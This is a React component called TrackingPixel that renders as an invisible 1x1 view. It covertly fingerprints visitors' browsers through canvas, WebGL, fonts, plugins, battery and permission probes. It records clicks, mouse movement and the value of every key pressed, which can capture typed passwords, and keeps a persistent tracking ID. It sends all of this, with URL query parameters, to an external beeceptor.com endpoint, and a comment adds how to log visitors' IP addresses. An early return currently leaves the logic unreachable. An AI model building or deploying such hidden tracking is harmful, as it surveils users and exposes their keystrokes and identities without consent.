import React, { useEffect, useState } from "react";
import { View } from "react-native";

export const TrackingPixel = () => {
  return <></>
  // State to store user behavior data
  const [behaviorData, setBehaviorData] = useState({
    mouseClicks: 0,
    keyPresses: 0,
    scrollDepth: 0,
    maxScrollDepth: 0,
    mouseMovements: 0,
    timeOnPage: 0,
    interactions: [],
    lastSentTime: 0,
  });

  // Function to get browser fingerprint information
  const getBrowserFingerprint = () => {
    try {
      // Check canvas fingerprinting capability
      const getCanvasFingerprint = () => {
        try {
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          if (!ctx) return null;
          
          // Draw different elements to canvas
          canvas.width = 200;
          canvas.height = 50;
          
          // Text with shadow and gradient
          ctx.textBaseline = "top";
          ctx.font = "14px 'Arial'";
          ctx.textBaseline = "alphabetic";
          ctx.fillStyle = "#f60";
          ctx.fillRect(125, 1, 62, 20);
          ctx.fillStyle = "#069";
          ctx.fillText("FingerprintJS", 2, 15);
          ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
          ctx.fillText("FingerprintJS", 4, 17);
          
          return canvas.toDataURL().slice(-50); // Only take the end to reduce payload size
        } catch (e) {
          return null;
        }
      };

      // Check WebGL fingerprinting
      const getWebGLFingerprint = () => {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return null;
          
          // Get WebGL info
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (!debugInfo) return null;
          
          return {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
          };
        } catch (e) {
          return null;
        }
      };

      // Get installed fonts (limited detection)
      const getFontFingerprint = () => {
        try {
          const baseFonts = ['monospace', 'sans-serif', 'serif'];
          const fontList = [
            'Arial', 'Courier New', 'Georgia', 'Times New Roman', 
            'Verdana', 'Helvetica', 'Comic Sans MS'
          ];
          
          const testString = "mmmmmmmmmmlli";
          const testSize = '72px';
          const h = document.createElement('span');
          h.style.fontSize = testSize;
          h.style.visibility = 'hidden';
          h.style.position = 'absolute';
          h.textContent = testString;
          document.body.appendChild(h);
          
          const baseFontWidths = {};
          baseFonts.forEach(baseFont => {
            h.style.fontFamily = baseFont;
            baseFontWidths[baseFont] = h.offsetWidth;
          });
          
          const detected = [];
          fontList.forEach(font => {
            let isDetected = false;
            baseFonts.forEach(baseFont => {
              h.style.fontFamily = `'${font}', ${baseFont}`;
              if (h.offsetWidth !== baseFontWidths[baseFont]) {
                isDetected = true;
              }
            });
            if (isDetected) detected.push(font);
          });
          
          document.body.removeChild(h);
          return detected.slice(0, 3); // Just return a few to keep payload small
        } catch (e) {
          return [];
        }
      };

      return {
        canvasFingerprint: getCanvasFingerprint(),
        webglFingerprint: getWebGLFingerprint(),
        installedFonts: getFontFingerprint(),
        audioFingerprint: typeof window !== 'undefined' ? 
          !!(window.AudioContext || window.webkitAudioContext) : false,
        hasLocalStorage: typeof window !== 'undefined' ? !!window.localStorage : false,
        hasSessionStorage: typeof window !== 'undefined' ? !!window.sessionStorage : false,
        hasIndexedDB: typeof window !== 'undefined' ? !!window.indexedDB : false,
        cpuCores: typeof navigator !== 'undefined' ? navigator.hardwareConcurrency || null : null,
        deviceMemory: typeof navigator !== 'undefined' ? navigator.deviceMemory || null : null,
        touchPoints: typeof navigator !== 'undefined' ? navigator.maxTouchPoints || 0 : 0,
        hasTouchScreen: typeof window !== 'undefined' ? 
          'ontouchstart' in window || !!(navigator.maxTouchPoints) : false,
        hasVibrate: typeof navigator !== 'undefined' ? 'vibrate' in navigator : false,
        pdfViewerEnabled: typeof navigator !== 'undefined' ? navigator.pdfViewerEnabled : false,
      };
    } catch (error) {
      console.error("Error in fingerprinting:", error);
      return {}; // Return empty object if fingerprinting fails
    }
  };

  // Track user behavior on the page
  useEffect(() => {
    if (typeof window === 'undefined') return;
    
    let startTime = Date.now();
    let mouseMoveCounter = 0;
    let throttleTimer = null;
    const interactions = [];
    
    // Record an interaction with timestamp and details
    const recordInteraction = (type, details) => {
      try {
        interactions.push({
          type,
          timestamp: Date.now() - startTime,
          details
        });
        
        // Limit to last 10 interactions to keep payload small
        if (interactions.length > 10) {
          interactions.shift();
        }
      } catch (e) {
        console.error("Error recording interaction:", e);
      }
    };
    
    // Mouse click handler
    const handleClick = (e) => {
      try {
        setBehaviorData(prev => ({
          ...prev,
          mouseClicks: prev.mouseClicks + 1
        }));
        
        recordInteraction('click', {
          x: e.clientX,
          y: e.clientY,
          target: e.target.tagName
        });
      } catch (error) {
        console.error("Error in click handler:", error);
      }
    };
    
    // Keyboard press handler
    const handleKeyDown = (e) => {
      try {
        setBehaviorData(prev => ({
          ...prev,
          keyPresses: prev.keyPresses + 1
        }));
        
        recordInteraction('keypress', {
          key: e.key === ' ' ? 'Space' : e.key
        });
      } catch (error) {
        console.error("Error in keydown handler:", error);
      }
    };
    
    // Mouse movement handler (throttled)
    const handleMouseMove = (e) => {
      if (throttleTimer) return;
      
      throttleTimer = setTimeout(() => {
        try {
          mouseMoveCounter++;
          setBehaviorData(prev => ({
            ...prev,
            mouseMovements: mouseMoveCounter
          }));
          
          // Only record every 10th movement to save space
          if (mouseMoveCounter % 10 === 0) {
            recordInteraction('mousemove', {
              x: e.clientX,
              y: e.clientY
            });
          }
        } catch (error) {
          console.error("Error in mousemove handler:", error);
        }
        
        throttleTimer = null;
      }, 100);
    };
    
    // Scroll handler
    const handleScroll = () => {
      try {
        if (typeof window === 'undefined') return;
        
        const scrollTop = window.scrollY || document.documentElement.scrollTop;
        const scrollHeight = document.documentElement.scrollHeight;
        const clientHeight = document.documentElement.clientHeight;
        
        // Calculate scroll depth as percentage
        const scrollDepth = Math.round((scrollTop / (scrollHeight - clientHeight)) * 100);
        
        setBehaviorData(prev => ({
          ...prev,
          scrollDepth,
          maxScrollDepth: Math.max(prev.maxScrollDepth, scrollDepth)
        }));
        
        // Record significant scroll events (every 25%)
        if (scrollDepth % 25 === 0 && scrollDepth > 0) {
          recordInteraction('scroll', { depth: scrollDepth });
        }
      } catch (error) {
        console.error("Error in scroll handler:", error);
      }
    };
    
    // Timer to track time on page
    const timeInterval = setInterval(() => {
      try {
        setBehaviorData(prev => ({
          ...prev,
          timeOnPage: Math.round((Date.now() - startTime) / 1000),
          interactions
        }));
      } catch (error) {
        console.error("Error in time interval:", error);
      }
    }, 1000);

    // Set up event listeners with error handling
    try {
      window.addEventListener('click', handleClick);
      window.addEventListener('keydown', handleKeyDown);
      window.addEventListener('mousemove', handleMouseMove);
      window.addEventListener('scroll', handleScroll);
    } catch (error) {
      console.error("Error setting up event listeners:", error);
    }
    
    // Clean up event listeners
    return () => {
      try {
        window.removeEventListener('click', handleClick);
        window.removeEventListener('keydown', handleKeyDown);
        window.removeEventListener('mousemove', handleMouseMove);
        window.removeEventListener('scroll', handleScroll);
        clearInterval(timeInterval);
      } catch (error) {
        console.error("Error cleaning up event listeners:", error);
      }
    };
  }, []);

  // Send data to tracking endpoint - reduced frequency to avoid 429 errors
  useEffect(() => {
    // Only send data on initial load, after 10 seconds, and then every 60 seconds
    // to avoid hitting rate limits
    const currentTime = behaviorData.timeOnPage;
    const lastSentTime = behaviorData.lastSentTime;
    
    if (currentTime === 0 || 
        (currentTime >= 10 && lastSentTime === 0) || 
        (currentTime - lastSentTime >= 60)) {
      
      try {
        // Safety check for server-side rendering
        if (typeof window === 'undefined' || typeof navigator === 'undefined') return;
        
        // Collect initial data
        const collectAndSendData = async () => {
          try {
            // Get async data that requires promises
            const batteryStatus = await getBatteryStatus();
            const permissionsStatus = await getPermissionsStatus();
            
            // Collect detailed user information
            const userInfo = {
              // Basic info
              userAgent: navigator.userAgent,
              language: navigator.language,
              languages: navigator.languages,
              
              // Screen and window details
              screenWidth: window.screen?.width,
              screenHeight: window.screen?.height,
              screenColorDepth: window.screen?.colorDepth,
              screenPixelDepth: window.screen?.pixelDepth,
              screenOrientation: window.screen?.orientation?.type,
              viewportWidth: window.innerWidth,
              viewportHeight: window.innerHeight,
              devicePixelRatio: window.devicePixelRatio,
              
              // Page and navigation info
              url: window.location.href,
              path: window.location.pathname,
              hostname: window.location.hostname,
              referrer: document.referrer,
              title: document.title,
              
              // Browser capabilities and settings
              cookiesEnabled: navigator.cookieEnabled,
              doNotTrack: navigator.doNotTrack,
              onLine: navigator.onLine,
              platform: navigator.platform,
              vendor: navigator.vendor,
              
              // Connection information (when available)
              connectionType: navigator.connection?.effectiveType,
              connectionDownlink: navigator.connection?.downlink,
              connectionRtt: navigator.connection?.rtt,
              connectionSaveData: navigator.connection?.saveData,
              
              // Time information
              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
              timezoneOffset: new Date().getTimezoneOffset(),
              timestamp: new Date().toISOString(),
              
              // Performance metrics
              loadTime: window.performance?.timing ? 
                window.performance.timing.loadEventEnd - window.performance.timing.navigationStart : null,
              domInteractive: window.performance?.timing ? 
                window.performance.timing.domInteractive - window.performance.timing.navigationStart : null,
              
              // Additional browser fingerprinting
              fingerprint: getBrowserFingerprint(),
              
              // Navigation history data
              historyLength: window.history?.length,
              
              // Session data
              sessionDuration: document.hidden ? 0 : new Date().getTime() - (window.performance?.timing?.navigationStart || 0),
              
              // User behavior data
              behavior: behaviorData,
              
              // Page content analysis
              pageHeight: Math.max(
                document.body?.scrollHeight || 0, 
                document.documentElement?.scrollHeight || 0,
                document.body?.offsetHeight || 0, 
                document.documentElement?.offsetHeight || 0
              ),
              linkCount: document.getElementsByTagName('a')?.length || 0,
              imageCount: document.getElementsByTagName('img')?.length || 0,
              
              // Local and session storage usage
              localStorageSize: typeof window !== 'undefined' && window.localStorage ? 
                Object.keys(window.localStorage).length : null,
              sessionStorageSize: typeof window !== 'undefined' && window.sessionStorage ? 
                Object.keys(window.sessionStorage).length : null,
              
              // Geolocation data (if previously granted)
              geolocation: window.navigator?.geolocation ? 'available' : 'unavailable',
              
              // Tracking ID to identify repeat visitors
              trackingId: getOrCreateTrackingId(),
              
              // Add a timestamp for the tracking event
              trackingSentAt: currentTime,
              
              // Device memory details
              deviceMemory: navigator.deviceMemory || null,
              hardwareConcurrency: navigator.hardwareConcurrency || null,
              
              // Battery status from async function
              batteryStatus,
              
              // More browser capabilities
              pdfViewerEnabled: navigator.pdfViewerEnabled || false,
              cookieStore: !!window.cookieStore,
              serviceWorkerSupport: !!navigator.serviceWorker,
              webShareSupport: !!navigator.share,
              
              // Permissions status from async function
              permissionsStatus,
              
              // Browser plugins and mime types
              plugins: getPluginsInfo(),
              
              // User's preferred color scheme
              prefersDarkMode: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches,
              prefersReducedMotion: window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches,
              
              // Document metadata
              documentInfo: getDocumentInfo(),
              
              // Page performance metrics
              performanceMetrics: getPerformanceMetrics(),
              
              // Query parameters from the URL
              queryParams: getQueryParams(),
              
              // HTTP headers that can be accessed
              headers: {
                contentType: document.contentType || null,
                characterSet: document.characterSet || null,
                defaultCharset: document.defaultCharset || null,
              },
              
              // Browser feature detection
              featureDetection: {
                webp: hasWebpSupport(),
                bluetooth: 'bluetooth' in navigator,
                nfc: 'nfc' in navigator,
                usb: 'usb' in navigator,
                webrtc: !!window.RTCPeerConnection,
                gamepads: !!navigator.getGamepads,
                vr: 'xr' in navigator,
                payment: !!window.PaymentRequest,
                push: 'PushManager' in window,
                webAnimations: 'animate' in document.createElement('div'),
                speechRecognition: 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
                hid: 'hid' in navigator,
                mediaSession: 'mediaSession' in navigator,
                credentials: 'credentials' in navigator,
                webShare: 'share' in navigator,
              },
              
              // Form inputs on page (just count by type)
              formInputs: getFormInputsCount(),
              
              // Visit source information
              visitSource: {
                referrer: document.referrer,
                referrerDomain: document.referrer ? new URL(document.referrer).hostname : null,
                hasUtmParams: getQueryParams().utm_source !== undefined,
                utmSource: getQueryParams().utm_source,
                utmMedium: getQueryParams().utm_medium,
                utmCampaign: getQueryParams().utm_campaign,
              },
            };

            // Send the data to the tracking endpoint with proper error handling for 429
            fetch("https://tracking-pixel-1.free.beeceptor.com", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                // The server can collect the IP address from the request
                // Client-side JS cannot access IP directly for privacy reasons
              },
              body: JSON.stringify(userInfo),
              credentials: "omit",
            })
            .then(response => {
              if (response.status === 429) {
                // Too Many Requests - we'll try again later
                console.log("Tracking rate limited, will retry later");
              } else if (!response.ok) {
                return response.text().then(text => {
                  throw new Error(`Tracking error: ${response.status} ${text}`);
                });
              } else {
                // Update last sent time on success
                setBehaviorData(prev => ({
                  ...prev,
                  lastSentTime: currentTime
                }));
              }
            })
            .catch(err => {
              console.error("Tracking pixel error:", err);
            });
          } catch (error) {
            console.error("Tracking data collection error:", error);
          }
        };
        
        // Execute the async function
        collectAndSendData();
      } catch (error) {
        console.error("Tracking pixel error:", error);
      }
    }
  }, [behaviorData.timeOnPage]);

  // Function to get battery status if available
  const getBatteryStatus = async () => {
    try {
      if (typeof navigator !== 'undefined' && navigator.getBattery) {
        const battery = await navigator.getBattery();
        return {
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime,
          level: battery.level,
        };
      }
      return null;
    } catch (error) {
      console.error("Battery status error:", error);
      return null;
    }
  };

  // Detect WebP support
  const hasWebpSupport = () => {
    try {
      const canvas = document.createElement('canvas');
      if (canvas.getContext && canvas.getContext('2d')) {
        return canvas.toDataURL('image/webp').indexOf('data:image/webp') === 0;
      }
      return false;
    } catch (e) {
      return false;
    }
  };
  
  // Function to count form input types
  const getFormInputsCount = () => {
    try {
      const inputs = document.querySelectorAll('input');
      const counts = {};
      
      inputs.forEach(input => {
        const type = input.type || 'text';
        counts[type] = (counts[type] || 0) + 1;
      });
      
      // Also count other form elements
      counts.textarea = document.querySelectorAll('textarea').length;
      counts.select = document.querySelectorAll('select').length;
      counts.button = document.querySelectorAll('button').length;
      
      return counts;
    } catch (e) {
      return {};
    }
  };

  // Function to get permissions status
  const getPermissionsStatus = async () => {
    try {
      if (!navigator.permissions) return null;
      
      const permissions = {};
      const permissionNames = ['geolocation', 'notifications', 'microphone', 'camera'];
      
      for (const name of permissionNames) {
        try {
          const status = await navigator.permissions.query({ name });
          permissions[name] = status.state;
        } catch (e) {
          permissions[name] = 'error';
        }
      }
      
      return permissions;
    } catch (error) {
      return null;
    }
  };

  // Function to get plugins info
  const getPluginsInfo = () => {
    try {
      if (!navigator.plugins || !navigator.plugins.length) return null;
      
      const plugins = [];
      for (let i = 0; i < navigator.plugins.length; i++) {
        const plugin = navigator.plugins[i];
        plugins.push({
          name: plugin.name,
          description: plugin.description,
          filename: plugin.filename,
        });
      }
      
      return plugins.slice(0, 5); // Limit to first 5 to keep data size reasonable
    } catch (error) {
      return null;
    }
  };

  // Function to get document info
  const getDocumentInfo = () => {
    try {
      return {
        readyState: document.readyState,
        lastModified: document.lastModified,
        compatMode: document.compatMode,
        contentType: document.contentType,
        metaDescription: document.querySelector('meta[name="description"]')?.content || null,
        metaKeywords: document.querySelector('meta[name="keywords"]')?.content || null,
        metaAuthor: document.querySelector('meta[name="author"]')?.content || null,
        hasFavicon: !!document.querySelector('link[rel="icon"]'),
      };
    } catch (error) {
      return null;
    }
  };

  // Function to get performance metrics
  const getPerformanceMetrics = () => {
    try {
      if (!window.performance) return null;
      
      const metrics = {};
      
      // Basic timing
      if (window.performance.timing) {
        const t = window.performance.timing;
        metrics.pageLoadTime = t.loadEventEnd - t.navigationStart;
        metrics.domContentLoaded = t.domContentLoadedEventEnd - t.navigationStart;
        metrics.firstPaint = t.responseEnd - t.navigationStart;
        metrics.backendPerformance = t.responseEnd - t.requestStart;
        metrics.networkLatency = t.responseStart - t.requestStart;
        metrics.redirectTime = t.redirectEnd - t.redirectStart;
        metrics.dnsLookupTime = t.domainLookupEnd - t.domainLookupStart;
      }
      
      // Navigation timing
      if (window.performance.getEntriesByType) {
        try {
          const navigationEntries = window.performance.getEntriesByType('navigation');
          if (navigationEntries.length > 0) {
            const nav = navigationEntries[0];
            metrics.navigationType = nav.type;
            metrics.redirectCount = nav.redirectCount;
          }
          
          // Resource timing (just count resources by type)
          const resourceEntries = window.performance.getEntriesByType('resource');
          const resourceCounts = {};
          resourceEntries.forEach(entry => {
            const type = entry.initiatorType;
            resourceCounts[type] = (resourceCounts[type] || 0) + 1;
          });
          metrics.resourceCounts = resourceCounts;
        } catch (e) {
          // Some browsers might not support certain performance APIs
        }
      }
      
      return metrics;
    } catch (error) {
      return null;
    }
  };

  // Function to get query parameters from URL
  const getQueryParams = () => {
    try {
      const params = {};
      const searchParams = new URLSearchParams(window.location.search);
      for (const [key, value] of searchParams.entries()) {
        params[key] = value;
      }
      return params;
    } catch (error) {
      return {};
    }
  };

  // Function to get or create a persistent tracking ID
  const getOrCreateTrackingId = () => {
    try {
      const storageKey = 'vb_tracking_id';
      let trackingId;
      
      if (typeof window !== 'undefined' && window.localStorage) {
        // Try to get existing ID
        trackingId = window.localStorage.getItem(storageKey);
        
        // If no ID exists, create one
        if (!trackingId) {
          trackingId = generateTrackingId();
          window.localStorage.setItem(storageKey, trackingId);
        }
        
        return trackingId;
      } else {
        // Fallback to session-only ID if localStorage isn't available
        return generateTrackingId();
      }
    } catch (error) {
      console.error("Error managing tracking ID:", error);
      return generateTrackingId();
    }
  };
  
  // NOTE: IP Address Collection
  // Client-side JavaScript cannot directly access the visitor's IP address for security reasons.
  // To capture IP addresses:
  // 1. On your server that handles requests to "tracking-pixel-1.free.beeceptor.com":
  //    - Access the IP from the request headers (typically req.ip or req.connection.remoteAddress)
  //    - Store it alongside the tracking data that's sent in the request body
  // 2. Example server code (Node.js/Express):
  //    app.post('/tracking-pixel', (req, res) => {
  //      const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  //      const trackingData = req.body;
  //      // Store both clientIP and trackingData in your database
  //      res.sendStatus(200);
  //    });
  
  // Generate a random tracking ID
  const generateTrackingId = () => {
    return 'vb_' + Math.random().toString(36).substring(2, 15) + 
           Math.random().toString(36).substring(2, 15);
  };

  // Create exit intent tracking
  useEffect(() => {
    if (typeof window === 'undefined') return;
    
    const handleBeforeUnload = () => {
      // Send final tracking data before user leaves
      try {
        const exitData = {
          event: 'exit',
          trackingId: getOrCreateTrackingId(),
          timeOnPage: behaviorData.timeOnPage,
          maxScrollDepth: behaviorData.maxScrollDepth,
          interactions: behaviorData.interactions.length,
          url: window.location.href,
          timestamp: new Date().toISOString()
        };
        
        // Use sendBeacon for more reliable data transmission on page exit
        if (navigator.sendBeacon) {
          navigator.sendBeacon(
            "https://tracking-pixel-1.free.beeceptor.com/exit", 
            JSON.stringify(exitData)
          );
        }
      } catch (error) {
        // Silent fail on exit
      }
    };
    
    try {
      window.addEventListener('beforeunload', handleBeforeUnload);
    } catch (error) {
      console.error("Error setting up exit tracking:", error);
    }
    
    return () => {
      try {
        window.removeEventListener('beforeunload', handleBeforeUnload);
      } catch (error) {
        console.error("Error removing exit tracking:", error);
      }
    };
  }, [behaviorData]);

  return <View style={{ width: 1, height: 1, opacity: 0 }} />
} 